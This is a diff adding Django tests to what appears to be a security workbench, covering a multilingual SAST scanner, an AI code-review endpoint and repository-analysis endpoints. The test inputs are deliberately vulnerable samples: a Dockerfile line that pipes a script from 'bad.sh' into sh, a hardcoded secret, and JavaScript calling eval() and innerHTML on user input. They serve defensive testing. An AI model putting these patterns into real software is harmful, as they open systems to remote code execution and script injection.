@@ -302,3 +302,144 @@ class Axe4UITestCase(TestCase):
         forge_py = Path("forge_server.py").read_text(encoding="utf-8")
         self.assertIn("max-width: 768px", forge_py)
         self.assertIn("max-width: 480px", forge_py)
+
+
+    def test_multilang_demo_snippets_and_language_sync(self):
+        """Vérifie la synchronisation multilingue (fr/en/sw/pt) pour SAST & Gemma ainsi que les 4 démos (Python, Dockerfile, YAML, JavaScript)."""
+        import json
+
+        # 1. Dashboard contient les 4 types de démos vulnérables et les boutons de sélection
+        resp_dash = self.client.get(reverse("dashboard"))
+        self.assertEqual(resp_dash.status_code, 200)
+        dash_html = resp_dash.content.decode("utf-8")
+        self.assertIn("DEMO_FILES_META", dash_html)
+        self.assertIn("Dockerfile.sovereign", dash_html)
+        self.assertIn("gitlab-ci-sovereign.yml", dash_html)
+        self.assertIn("workbench_payment_gateway.js", dash_html)
+        self.assertIn('data-demo-type="python"', dash_html)
+        self.assertIn('data-demo-type="dockerfile"', dash_html)
+        self.assertIn('data-demo-type="yaml"', dash_html)
+        self.assertIn('data-demo-type="javascript"', dash_html)
+
+        # 2. Scan SAST Dockerfile en anglais (en) et swahili (sw)
+        dockerfile_code = "FROM python:latest\nUSER root\nENV SECRET_TOKEN = 'hardcoded123456'\nRUN curl -sSL https://bad.sh | sh\n"
+        scan_en = self.client.post(
+            "/api/security/scan/",
+            data=json.dumps({"filename": "Dockerfile", "content": dockerfile_code, "lang": "en"}),
+            content_type="application/json",
+            HTTP_X_BANTU_WORKBENCH="interactive-demo",
+        )
+        self.assertEqual(scan_en.status_code, 200)
+        data_en = scan_en.json()
+        self.assertEqual(data_en["lang"], "en")
+        self.assertGreaterEqual(data_en["total_issues"], 3)
+        descs_en = " | ".join(v["description"] for v in data_en["issues"])
+        self.assertIn("Unpinned Docker image (:latest)", descs_en)
+        self.assertIn("Secret exposed in Dockerfile ENV", descs_en)
+
+        # 3. Scan SAST JavaScript en portugais (pt)
+        js_code = "const x = eval(userInput);\ndocument.getElementById('a').innerHTML = userInput;\n"
+        scan_pt = self.client.post(
+            "/api/security/scan/",
+            data=json.dumps({"filename": "app.js", "content": js_code, "lang": "pt"}),
+            content_type="application/json",
+            HTTP_X_BANTU_WORKBENCH="interactive-demo",
+        )
+        self.assertEqual(scan_pt.status_code, 200)
+        data_pt = scan_pt.json()
+        self.assertEqual(data_pt["lang"], "pt")
+        descs_pt = " | ".join(v["description"] for v in data_pt["issues"])
+        self.assertIn("eval()", descs_pt)
+        self.assertIn("innerHTML", descs_pt)
+
+        # 4. Ask Gemma Review synchronisé en anglais (en) et swahili (sw)
+        from unittest.mock import patch
+
+        with patch("apps.ai_assistant.gemma.requests.post", side_effect=ConnectionError("offline")):
+            gemma_en = self.client.post(
+                "/api/ai/review/",
+                data=json.dumps({"filename": "Dockerfile", "code": dockerfile_code, "lang": "en"}),
+                content_type="application/json",
+                HTTP_X_BANTU_WORKBENCH="interactive-demo",
+            )
+            self.assertEqual(gemma_en.status_code, 200)
+            self.assertIn("BantuDevLab AI Review (Sovereign Gemma 2 2B Engine)", gemma_en.json()["response"])
+
+            gemma_sw = self.client.post(
+                "/api/ai/review/",
+                data=json.dumps({"filename": "app.js", "code": js_code, "lang": "sw"}),
+                content_type="application/json",
+                HTTP_X_BANTU_WORKBENCH="interactive-demo",
+            )
+            self.assertEqual(gemma_sw.status_code, 200)
+            self.assertIn("Ukaguzi wa BantuDevLab AI", gemma_sw.json()["response"])
+
+    def test_pro_command_terminal_and_repo_actions(self):
+        """Vérifie le terminal de commande Pro sans zone de saisie libre et les endpoints d'analyse de dépôt Gitea."""
+        import json
+        from pathlib import Path
+
+        # 1. Script terminal présent et lié dans Django et Gitea
+        terminal_js = Path("static/js/bantu-command-terminal.js").read_text(encoding="utf-8")
+        self.assertIn("bantu-command-terminal-modal", terminal_js)
+        self.assertIn("bantu-cmd-plus-btn", terminal_js)
+        self.assertIn("bantu-cmd-repo-select", terminal_js)
+        self.assertIn("bantu-cmd-branch-select", terminal_js)
+        self.assertIn("bantu-cmd-file-select", terminal_js)
+        self.assertIn("bantu-cmd-exec-btn", terminal_js)
+        self.assertIn("bantu-cmd-results-panel", terminal_js)
+        self.assertIn("openBantuCommandTerminal", terminal_js)
+
+        repo_header = Path("custom/templates/repo/header.tmpl").read_text(encoding="utf-8")
+        self.assertIn("openBantuCommandTerminal('security'", repo_header)
+        self.assertIn("openBantuCommandTerminal('gemma'", repo_header)
+
+        # 2. Endpoint RepoExplorerView (/api/forge/repo-explorer/)
+        explorer_resp = self.client.get("/api/forge/repo-explorer/?lang=en")
+        self.assertEqual(explorer_resp.status_code, 200)
+        explorer_data = explorer_resp.json()
+        self.assertIn("repositories", explorer_data)
+        self.assertGreaterEqual(len(explorer_data["repositories"]), 1)
+        self.assertIn("branches", explorer_data)
+        self.assertIn("files", explorer_data)
+
+        # 3. Endpoint RepoCommandAnalyzeView (/api/forge/repo-analyze/) pour Security & Gemma sur tous les fichiers (*)
+        sec_resp = self.client.post(
+            "/api/forge/repo-analyze/",
+            data=json.dumps(
+                {
+                    "action": "security",
+                    "repository": "SovereignCore/Bantu-Network-Node",
+                    "branch": "main",
+                    "file_path": "*",
+                    "lang": "en",
+                }
+            ),
+            content_type="application/json",
+        )
+        self.assertEqual(sec_resp.status_code, 200)
+        sec_data = sec_resp.json()
+        self.assertEqual(sec_data["action"], "security")
+        self.assertGreaterEqual(len(sec_data["files_analyzed"]), 1)
+        self.assertIn("sovereignty_score", sec_data)
+
+        from unittest.mock import patch
+
+        with patch("apps.ai_assistant.gemma.requests.post", side_effect=ConnectionError("offline")):
+            gemma_resp = self.client.post(
+                "/api/forge/repo-analyze/",
+                data=json.dumps(
+                    {
+                        "action": "gemma",
+                        "repository": "SovereignCore/Bantu-Network-Node",
+                        "branch": "main",
+                        "file_path": "Dockerfile",
+                        "lang": "fr",
+                    }
+                ),
+                content_type="application/json",
+            )
+            self.assertEqual(gemma_resp.status_code, 200)
+            gemma_data = gemma_resp.json()
+            self.assertEqual(gemma_data["action"], "gemma")
+            self.assertIn("response", gemma_data)
